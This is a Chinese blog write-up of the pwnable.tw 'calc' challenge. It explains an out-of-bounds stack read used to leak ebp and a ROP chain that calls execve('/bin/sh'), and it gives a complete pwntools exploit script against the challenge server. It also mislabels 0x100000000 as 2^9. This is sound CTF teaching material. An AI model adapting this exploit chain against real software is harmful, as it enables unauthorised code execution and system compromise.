+<p>我是第一次使用ROP，感觉太好用了，教程参考这里<a
+target="_blank" rel="noopener" href="http://vancir.com/posts/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B"
+class="uri">http://vancir.com/posts/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B</a>。</p>
+<p>通过ROPgadget来查找小部件，类似于<code>pop eax; ret</code>或<code>mov eax, esp; ret</code>这样的代码碎片。具体的不再赘述。
+难点在于<code>/bin/sh\0</code>的地址；由于其存放在栈上，栈地址变化需要泄露出来。如何泄露栈地址？
+我们能泄露保存在栈上的栈地址就是<code>ebp</code>，在<code>a1[360]</code>位置处存放的值是<code>main</code>函数的ebp。那么我们只要确定main函数的栈空间大小即可。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08049452                 push    ebp</span><br><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08049458                 sub     esp, 10h</span><br></pre></td></tr></table></figure> main函数的栈空间大小计算方法是
+<code>($ebp &amp; 0xFFFFFFF0 -0x10)</code>。
+我们布置好ROP代码是从<code>a1[361]</code>开始，这里是<code>calc</code>函数返回地址，<code>/bin/sh\0</code>距离<code>calc</code>的返回地址是已知的，而<code>calc</code>返回地址在main函数栈指针esp低4字节位置。所以根据相对位置推出绝对位置。</p>
+<p>坑啊，ebp应该是无符号数，但是被当作有符号数输出，输出的是负数，需要加上0x100000000（2^9）才是无符号数的真实值。我被这个折腾了好久。</p>
+<p>python转换int32位无符号和有符号。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">def int32_to_uint32(i):</span><br><span class="line">    return ctypes.c_uint32(i).value</span><br></pre></td></tr></table></figure></p>
+<h1 id="代码">代码</h1>
+<p>有时候运行一次会中断，再运行一次即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=False</span><br><span class="line">if debug:</span><br><span class="line">    p = process(&quot;./calc&quot;)</span><br><span class="line">    #context.log_level=&quot;debug&quot;</span><br><span class="line">    #gdb.attach(p, &quot;b*0x08049499&quot;)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;chall.pwnable.tw&quot;,&quot;10100&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;=== Welcome to SECPROG calculator ===\n&quot;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">leak main function&#x27;s ebp</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload=&quot;+360&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">m_ebp =int(p.recv())</span><br><span class="line">log.success(&quot;main function&#x27;s ebp is %#x&quot;%m_ebp)</span><br><span class="line"></span><br><span class="line">esp_offset = (m_ebp+0x100000000)-((m_ebp+0x100000000) &amp;0xFFFFFFF0-0x10)</span><br><span class="line">m_esp = m_ebp - esp_offset</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">/bin/sh stores at offset 368</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">bin_str_addr = m_ebp - (esp_offset-6*4)</span><br><span class="line">log.success(&quot;bin/sh is at %#x&quot;%bin_str_addr )</span><br><span class="line"># 0x0805c34b : pop eax ; ret</span><br><span class="line"># 0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line"># 0x08049a21 : int 0x80</span><br><span class="line">rop_vars = [0x0805c34b, 0x0b, 0x080701d0, 0, 0, bin_str_addr, 0x08049a21, u32(&#x27;/bin&#x27;), u32(&#x27;/sh\0&#x27;)]</span><br><span class="line"></span><br><span class="line">for i in range(361, 370):</span><br><span class="line">    # get content</span><br><span class="line">    p.sendline(&#x27;+&#x27;+str(i))</span><br><span class="line">    c = int(p.recv())</span><br><span class="line">    if c &lt; 0:</span><br><span class="line">        c += 0x100000000</span><br><span class="line"></span><br><span class="line">    log.success(&quot;# before modification at %#x is %#x&quot;%(m_esp+ 4*(i-362), c))</span><br><span class="line">    log.success(&quot;+++var is %#x&quot;%rop_vars[i-361])</span><br><span class="line">    diff =  rop_vars[i-361] -c</span><br><span class="line">    if diff &lt; 0:</span><br><span class="line">        log.success(&#x27;+&#x27;+str(i)+str(diff))</span><br><span class="line">        p.sendline(&#x27;+&#x27;+str(i)+str(diff))</span><br><span class="line">    else:</span><br><span class="line">        log.success(&#x27;+&#x27;+str(i)+&#x27;+&#x27;+str(diff))</span><br><span class="line">        p.sendline(&#x27;+&#x27;+str(i)+&#x27;+&#x27;+str(diff))</span><br><span class="line">    content = int(p.recv())</span><br><span class="line">    log.success(&quot;# After modification at %#x is %#x&quot;%(m_esp+ 4*(i-362), content))</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;pwn&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line">           </span><br></pre></td></tr></table></figure>
+<h1 id="参考">参考</h1>
+<p>[1] <a
+target="_blank" rel="noopener" href="http://www.freebuf.com/articles/others-articles/132283.html">Pwnable.tw刷题之calc</a>
+[2] <a target="_blank" rel="noopener" href="http://www.jianshu.com/p/d59a41d85af1">Pwnable.tw
+calc</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
+              <a href="/tags/rop/" rel="tag"># rop</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/09/22/Plaid-CTF-2015-PlaidDB-writeup/" rel="prev" title="Plaid CTF 2015- PlaidDB writeup">
+                  <i class="fa fa-angle-left"></i> Plaid CTF 2015- PlaidDB writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/10/03/2015-0ctf-freenote-writeup/" rel="next" title="2015 0ctf freenote writeup">
+                  2015 0ctf freenote writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
